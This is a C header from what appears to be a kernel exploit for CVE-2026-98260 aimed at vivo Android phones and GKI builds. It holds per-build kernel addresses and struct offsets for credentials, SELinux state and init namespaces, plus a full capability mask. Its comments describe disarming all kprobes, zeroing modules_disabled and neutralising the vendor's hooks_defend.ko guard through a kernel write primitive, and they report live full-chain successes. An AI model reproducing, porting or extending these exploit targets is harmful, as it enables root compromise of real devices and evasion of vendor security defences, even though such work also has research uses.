#ifndef TARGETS_H
#define TARGETS_H

/*
 * Multi-kernel target table for CVE-2026-98260.
 *
 * Each entry matches the kernel release by prefix (up to and including the
 * git commit: 6.6.127-android15-8-g<hash>); the build artifact id and the
 * page-size suffix are ignored. The first matching entry wins; the ordering
 * is irrelevant.
 *
 * Layout/size constants are shared across builds of the same base because
 * this family ships CONFIG_RANDSTRUCT_NONE (the struct layouts are the
 * compiler defaults). The _STATIC addresses and the low21 call-site bits are
 * per-build and come from that build's vmlinux (kallsyms + BTF + disasm).
 */

struct target
{
    const char *prefix; /* release-string prefix matched against uname */
    /* per-build, from vmlinux kallsyms/disasm */
    unsigned long long static_timer_site;
    unsigned long long timer_site_low21;
    unsigned long long selinux_state_static;
    unsigned long long panic_on_warn_static;
    unsigned long long copy_process_low21;
    unsigned long long root_user_static;
    unsigned long long init_user_ns_static;
    unsigned long long init_ucounts_static;
    unsigned long long init_groups_static;
    unsigned long long tp_sys_exit_static;
    /* layout/size constants (shared across builds of this base) */
    unsigned long long timer_alloc;
    unsigned long long cred_req;
    unsigned long long cred_alloc;
    unsigned long long cred_uid_off;
    unsigned long long off_task_cred;
    unsigned long long task_alloc_bytes;
    unsigned long long fullcap;
    unsigned long long selinux_blob_off;
    unsigned selinux_sid_kernel;
    unsigned long long vr_tag_a_off;
    unsigned long long vr_tag_b_off;
    unsigned long long tracepoint_funcs_off;
    /* vivo: modules_disabled zero-write before the ksud late-load
     * (0 = skip the stage, i.e. non-vivo targets). */
    unsigned long long modules_disabled_static;
    /* vivo OOS7: hooks_defend.ko (new in 17.2.10.6) installs kprobes on
     * the module-load path and denies every finit_module from this
     * context (dmesg "hks-dfd: phlm/kh_in_ret", EPERM). Writing any
     * nonzero value to kernel/kprobes.c:kprobes_all_disarmed disarms ALL
     * kprobes — the module's only hook mechanism (its imports are
     * register/unregister_kprobe, no ftrace/livepatch). 0 = skip. */
    unsigned long long kprobes_disarm_static;
    /* vivo OOS7: hooks_defend.ko ("hks-dfd") defends itself with eight
     * hook structs in the module .bss (a load_module kprobe at +0xc8,
     * a load_module kretprobe at +0x148, six kprobes at +0x410..0x690;
     * pre_handler fields at +0x40 each) plus a 14-byte permuted flag/
     * slot table in .data (+0x140; .data begins at .bss+0x710).  The
     * finit_module deny, the kptr_restrict re-pin and every mask path
     * hang off those.  The neutralize stages zero the flag table and
     * all eight pre_handlers via the runtime .bss base that the rooted
     * child resolves from /proc/kallsyms -- which only shows real
     * addresses once kernel/sysctl.c:kptr_restrict is 0 (static address
     * here; the write primitive is used, not the sysctl that the guard
     * blocks).  The child must hold its kallsyms fd open BEFORE the
     * zero: the guard re-pins kptr_restrict at every open, but masking
     * is decided per row at read time against the opener's f_cred.
     * 0 = skip (non-OOS7 targets). */
    unsigned long long kptr_restrict_static;
};

static const struct target g_targets[] = {
    {
        /*
         * 6.6.127-android15-8-g468e81627094-abogki530796776-4k
         * vivo X200 Ultra (PD2454) OriginOS 6, 16.1.20.8.W10.V000L1.
         * Constants proven live (multiple full-chain successes); see
         * ../pd2454-cve-2026-98260/PORTING.md for the derivations.
         */
        .prefix = "6.6.127-android15-8-g468e81627094",
        .static_timer_site = 0xffffffc080197fdcULL,
        .timer_site_low21 = 0x197fdcULL,
        .selinux_state_static = 0xffffffc08239a170ULL,
        .panic_on_warn_static = 0xffffffc08214ac0cULL,
        .copy_process_low21 = 0xac790ULL,
        .root_user_static = 0xffffffc08216f108ULL,
        .init_user_ns_static = 0xffffffc08216ee78ULL,
        .init_ucounts_static = 0xffffffc082170bd8ULL,
        .init_groups_static = 0xffffffc082170668ULL,
        .tp_sys_exit_static = 0xffffffc0822f36a0ULL,
        .timer_alloc = 0x108ULL,
        .cred_req = 0xb8ULL,
        .cred_alloc = 0xc0ULL,
        .cred_uid_off = 0x8ULL,
        .off_task_cred = 0x820ULL,
        .task_alloc_bytes = 0x12c0ULL,
        .fullcap = 0x1ffffffffffULL,
        .selinux_blob_off = 0x0ULL,
        .selinux_sid_kernel = 1U,
        .vr_tag_a_off = 0x06ULL,
        .vr_tag_b_off = 0x2cULL,
        .tracepoint_funcs_off = 0x48ULL,
        .modules_disabled_static = 0xffffffc08237b800ULL,
        .kprobes_disarm_static = 0xffffffc08237ee80ULL,
        .kptr_restrict_static = 0ULL, /* 16.1.20.8: no hooks_defend.ko */
    },
    {
        /*
         * 6.6.127-android15-8-g3b723d0e8507-abogki558056638-4k
         * vivo X200 Ultra (PD2454) OriginOS 7, 17.2.10.6.W10.V000L1
         * (Android 17 / CP2A.260605.016, SPL 2026-10-01).
         *
         * Every constant verified from the build's Image (kallsyms via
         * vmlinux-to-elf + Ghidra disassembly) on 2026-10-31:
         *   - all data symbols sit at the SAME addresses as the
         *     6.6.127-android15-8-g468e81627094 build (16.1.20.8), so the
         *     init_* / selinux_state / panic_on_warn / modules_disabled
         *     statics are carried over unchanged;
         *   - timer site: bl kmem_cache_alloc at do_timer_create+0xa4
         *     (0xffffffc080197fe0), trace call_site (return addr) +4
         *     -> 0x197fe4;
         *   - __tracepoint_sys_exit moved +0xc0 -> 0xffffffc0822f3760;
         *   - copy_process (+0x140 bl kmem_cache_alloc_node) and
         *     prepare_creds (+0x20 bl kmem_cache_alloc) are byte-identical
         *     -> low21 sites unchanged (0xac790 / 0xe5754);
         *   - vr.ko (vendor_boot ramdisk) is byte-identical except
         *     vermagic/scmversion -> guard model (tag A task+0x06, tag B
         *     task+0x2c, sys_exit tp_funcs +0x48) unchanged.
         */
        .prefix = "6.6.127-android15-8-g3b723d0e8507",
        .static_timer_site = 0xffffffc080197fe4ULL,
        .timer_site_low21 = 0x197fe4ULL,
        .selinux_state_static = 0xffffffc08239a170ULL,
        .panic_on_warn_static = 0xffffffc08214ac0cULL,
        .copy_process_low21 = 0xac790ULL,
        .root_user_static = 0xffffffc08216f108ULL,
        .init_user_ns_static = 0xffffffc08216ee78ULL,
        .init_ucounts_static = 0xffffffc082170bd8ULL,
        .init_groups_static = 0xffffffc082170668ULL,
        .tp_sys_exit_static = 0xffffffc0822f3760ULL,
        .timer_alloc = 0x108ULL,
        .cred_req = 0xb8ULL,
        .cred_alloc = 0xc0ULL,
        .cred_uid_off = 0x8ULL,
        .off_task_cred = 0x820ULL,
        .task_alloc_bytes = 0x12c0ULL,
        .fullcap = 0x1ffffffffffULL,
        .selinux_blob_off = 0x0ULL,
        .selinux_sid_kernel = 1U,
        .vr_tag_a_off = 0x06ULL,
        .vr_tag_b_off = 0x2cULL,
        .tracepoint_funcs_off = 0x48ULL,
        .modules_disabled_static = 0xffffffc08237b800ULL,
        .kprobes_disarm_static = 0xffffffc08237ee80ULL,
        .kptr_restrict_static = 0xffffffc08215baf8ULL,
    },
    {
        .prefix = "6.6.127-android15-8-ga8e7fdfdc746",
        .static_timer_site = 0xffffffc080195bb4ULL,
        .timer_site_low21 = 0x195bb4ULL,
        .selinux_state_static = 0xffffffc08237a0e8ULL,
        .panic_on_warn_static = 0xffffffc08212ac0cULL,
        .copy_process_low21 = 0xab8bcULL,
        .root_user_static = 0xffffffc08214efe0ULL,
        .init_user_ns_static = 0xffffffc08214ed50ULL,
        .init_ucounts_static = 0xffffffc082150ab0ULL,
        .init_groups_static = 0xffffffc082150540ULL,
        .tp_sys_exit_static = 0xffffffc0822d35a0ULL,
        .timer_alloc = 0x108ULL,
        .cred_req = 0xb8ULL,
        .cred_alloc = 0xc0ULL,
        .cred_uid_off = 0x8ULL,
        .off_task_cred = 0x820ULL,
        .task_alloc_bytes = 0x12c0ULL,
        .fullcap = 0x1ffffffffffULL,
        .selinux_blob_off = 0x0ULL,
        .selinux_sid_kernel = 1U,
        .vr_tag_a_off = 0x06ULL,
        .vr_tag_b_off = 0x2cULL,
        .tracepoint_funcs_off = 0x48ULL,
    },
    {
        /*
         * 6.6.127-android15-8-g94150e51ff28-ab16242081-4k
         * ci.android.com build 16242081. Same base as the a8e7fdfdc build:
         * every static except __tracepoint_sys_exit (+0x40) is identical,
         * and the BTF layouts match exactly.
         */
        .prefix = "6.6.127-android15-8-g94150e51ff28",
        .static_timer_site = 0xffffffc080195bb4ULL,
        .timer_site_low21 = 0x195bb4ULL,
        .selinux_state_static = 0xffffffc08237a0e8ULL,
        .panic_on_warn_static = 0xffffffc08212ac0cULL,
        .copy_process_low21 = 0xab8bcULL,
        .root_user_static = 0xffffffc08214efe0ULL,
        .init_user_ns_static = 0xffffffc08214ed50ULL,
        .init_ucounts_static = 0xffffffc082150ab0ULL,
        .init_groups_static = 0xffffffc082150540ULL,
        .tp_sys_exit_static = 0xffffffc0822d35e0ULL,
        .timer_alloc = 0x108ULL,
        .cred_req = 0xb8ULL,
        .cred_alloc = 0xc0ULL,
        .cred_uid_off = 0x8ULL,
        .off_task_cred = 0x820ULL,
        .task_alloc_bytes = 0x12c0ULL,
        .fullcap = 0x1ffffffffffULL,
        .selinux_blob_off = 0x0ULL,
        .selinux_sid_kernel = 1U,
        .vr_tag_a_off = 0x06ULL,
        .vr_tag_b_off = 0x2cULL,
        .tracepoint_funcs_off = 0x48ULL,
    },
    {
        /*
         * 6.12.58-android16-6-g09eda8c8505a-ab15950084-4k
         * ci.android.com build 15950084. Derived from this build's vmlinux
         * (kallsyms + disasm + BTF): statics above, layouts below.
         * task_struct differs from the 6.6.127 base: size 0x1440,
         * cred @ 0x900. k_itimer is still 0x100 (cache alloc 0x108).
         * The vr.ko tag offsets are carried from the vivo family disasm
         * (PD2405 reference) - verify on-device.
         */
        .prefix = "6.12.58-android16-6-g09eda8c8505a",
        .static_timer_site = 0xffffffc080517744ULL,
        .timer_site_low21 = 0x151744ULL,
        .selinux_state_static = 0xffffffc0827c69a0ULL,
        .panic_on_warn_static = 0xffffffc08252afe0ULL,
        .copy_process_low21 = 0x1d7440ULL,
        .root_user_static = 0xffffffc082552370ULL,
        .init_user_ns_static = 0xffffffc0825520f8ULL,
        .init_ucounts_static = 0xffffffc082553d08ULL,
        .init_groups_static = 0xffffffc082553838ULL,
        .tp_sys_exit_static = 0xffffffc0826d8de0ULL,
        .timer_alloc = 0x108ULL,
        .cred_req = 0xb8ULL,
        .cred_alloc = 0xc0ULL,
        .cred_uid_off = 0x8ULL,
        .off_task_cred = 0x900ULL,
        .task_alloc_bytes = 0x1440ULL,
        .fullcap = 0x1ffffffffffULL,
        .selinux_blob_off = 0x0ULL,
        .selinux_sid_kernel = 1U,
        .vr_tag_a_off = 0x06ULL,
        .vr_tag_b_off = 0x2cULL,
        .tracepoint_funcs_off = 0x48ULL,
    },
    {
        /*
         * 6.6.127-android15-8-g24b70dd1cb81-abogki543627741-4k
         * vivo iQOO Neo10 Pro+ (PD2463) OriginOS 7, 17.2.9.7.W10.V000L1.
         * Constants derived from the build's kernel Image (kallsyms via
         * vmlinux-to-elf, capstone disassembly, BTF); 10/10 statics match
         * the independent profile in docs/20 of
         * janewas/cve-2026-98260-vivo-gki-research:
         *   - timer site: ldr x0,[posix_timers_cache] + bl
         *     kmem_cache_alloc at do_timer_create+0xa4, call_site (ret)
         *     0xffffffc080197fe4 -> 0x197fe4;
         *   - copy_process: bl kmem_cache_alloc_node ret +0x140 -> 0xac790;
         *   - BTF layouts match the g468e81627094 / g3b723d0e8507 entries
         *     (task_struct 0x12c0 cred@0x820, cred 0xb8 uid@0x8, k_itimer
         *     0x108 it_signal@0x60, signal_struct.posix_cputimers@0x120);
         *   - __tracepoint_sys_exit 0xffffffc0822f3720;
         *   - OriginOS 7: hooks_defend.ko is present (permanent module,
         *     kptr_restrict re-pinned).  HKD stays disabled
         *     (kptr_restrict_static = 0): untested on this build and
         *     unnecessary -- the chain is kallsyms-free and loads no
         *     modules.  The only per-build HKD input, the kptr_restrict
         *     address, is verified at 0xffffffc08215baf8 (identical to
         *     the g3b723d0e8507 entry); guard structures are resolved
         *     and signature-checked at runtime by the hkd stages.
         */
        .prefix = "6.6.127-android15-8-g24b70dd1cb81",
        .static_timer_site = 0xffffffc080197fe4ULL,
        .timer_site_low21 = 0x197fe4ULL,
        .selinux_state_static = 0xffffffc08239a170ULL,
        .panic_on_warn_static = 0xffffffc08214ac0cULL,
        .copy_process_low21 = 0xac790ULL,
        .root_user_static = 0xffffffc08216f108ULL,
        .init_user_ns_static = 0xffffffc08216ee78ULL,
        .init_ucounts_static = 0xffffffc082170bd8ULL,
        .init_groups_static = 0xffffffc082170668ULL,
        .tp_sys_exit_static = 0xffffffc0822f3720ULL,
        .timer_alloc = 0x108ULL,
        .cred_req = 0xb8ULL,
        .cred_alloc = 0xc0ULL,
        .cred_uid_off = 0x8ULL,
        .off_task_cred = 0x820ULL,
        .task_alloc_bytes = 0x12c0ULL,
        .fullcap = 0x1ffffffffffULL,
        .selinux_blob_off = 0x0ULL,
        .selinux_sid_kernel = 1U,
        .vr_tag_a_off = 0x06ULL,
        .vr_tag_b_off = 0x2cULL,
        .tracepoint_funcs_off = 0x48ULL,
        .modules_disabled_static = 0xffffffc08237b800ULL,
        .kprobes_disarm_static = 0xffffffc08237ee80ULL,
        .kptr_restrict_static = 0ULL, /* hooks_defend present; see above */
    },
    {
        /*
         * 6.6.127-android15-8-gd489d4ad2a70-abogki567717946-4k
         * vivo iQOO Neo10 Pro+ (PD2463) OriginOS 7, 17.2.9.12.W10.V000L1.
         * Derived from the build's kernel Image (kallsyms via
         * vmlinux-to-elf, capstone disassembly, BTF). Same GKI base as
         * g24b70dd1cb81: every .data static is unchanged, the text block
         * shifted slightly (do_timer_create +0x1c, kmem_cache_alloc
         * +0x324), and the BTF blob grew by 1423 bytes with identical
         * layouts (task_struct 0x12c0 cred@0x820, cred 0xb8 uid@0x8,
         * k_itimer 0x108 it_signal@0x60, signal_struct.posix_cputimers
         * @0x120).
         *   - timer site: ldr x0,[posix_timers_cache] + bl
         *     kmem_cache_alloc at do_timer_create+0xa4, call_site (ret)
         *     0xffffffc080198000 -> 0x198000;
         *   - copy_process: bl kmem_cache_alloc_node ret +0x140 ->
         *     0xac790 (unchanged);
         *   - __tracepoint_sys_exit 0xffffffc0822f3760;
         *   - hooks_defend.ko handling carried over from g24b70dd1cb81
         *     (kptr_restrict_static = 0; the chain is kallsyms-free and
         *     loads no modules).
         */
        .prefix = "6.6.127-android15-8-gd489d4ad2a70",
        .static_timer_site = 0xffffffc080198000ULL,
        .timer_site_low21 = 0x198000ULL,
        .selinux_state_static = 0xffffffc08239a170ULL,
        .panic_on_warn_static = 0xffffffc08214ac0cULL,
        .copy_process_low21 = 0xac790ULL,
        .root_user_static = 0xffffffc08216f108ULL,
        .init_user_ns_static = 0xffffffc08216ee78ULL,
        .init_ucounts_static = 0xffffffc082170bd8ULL,
        .init_groups_static = 0xffffffc082170668ULL,
        .tp_sys_exit_static = 0xffffffc0822f3760ULL,
        .timer_alloc = 0x108ULL,
        .cred_req = 0xb8ULL,
        .cred_alloc = 0xc0ULL,
        .cred_uid_off = 0x8ULL,
        .off_task_cred = 0x820ULL,
        .task_alloc_bytes = 0x12c0ULL,
        .fullcap = 0x1ffffffffffULL,
        .selinux_blob_off = 0x0ULL,
        .selinux_sid_kernel = 1U,
        .vr_tag_a_off = 0x06ULL,
        .vr_tag_b_off = 0x2cULL,
        .tracepoint_funcs_off = 0x48ULL,
        .modules_disabled_static = 0xffffffc08237b800ULL,
        .kprobes_disarm_static = 0xffffffc08237ee80ULL,
        .kptr_restrict_static = 0ULL, /* hooks_defend present; see above */
    },
};

/* Accessor macros: the exploit body keeps using the old constant names. */
#define STATIC_TIMER_SITE    (g_t->static_timer_site)
#define TIMER_SITE_LOW21     (g_t->timer_site_low21)
#define SELINUX_STATE_STATIC (g_t->selinux_state_static)
#define PANIC_ON_WARN_STATIC (g_t->panic_on_warn_static)
#define COPY_PROCESS_LOW21   (g_t->copy_process_low21)
#define ROOT_USER_STATIC     (g_t->root_user_static)
#define INIT_USER_NS_STATIC  (g_t->init_user_ns_static)
#define INIT_UCOUNTS_STATIC  (g_t->init_ucounts_static)
#define INIT_GROUPS_STATIC   (g_t->init_groups_static)
#define TP_SYS_EXIT_STATIC   (g_t->tp_sys_exit_static)
#define TIMER_ALLOC          (g_t->timer_alloc)
#define CRED_REQ             (g_t->cred_req)
#define CRED_ALLOC           (g_t->cred_alloc)
#define CRED_UID_OFF         (g_t->cred_uid_off)
#define OFF_TASK_CRED        (g_t->off_task_cred)
#define TASK_ALLOC_BYTES     (g_t->task_alloc_bytes)
#define FULLCAP              (g_t->fullcap)
#define SELINUX_BLOB_OFF     (g_t->selinux_blob_off)
#define SELINUX_SID_KERNEL   (g_t->selinux_sid_kernel)
#define VR_TAG_A_OFF         (g_t->vr_tag_a_off)
#define VR_TAG_B_OFF         (g_t->vr_tag_b_off)
#define TRACEPOINT_FUNCS_OFF (g_t->tracepoint_funcs_off)
#define MODULES_DISABLED_STATIC (g_t->modules_disabled_static)
#define KPROBES_DISARM_STATIC  (g_t->kprobes_disarm_static)
#define KPTR_RESTRICT_STATIC   (g_t->kptr_restrict_static)
#define HKD_ENABLED            (g_t->kptr_restrict_static)

#endif /* TARGETS_H */
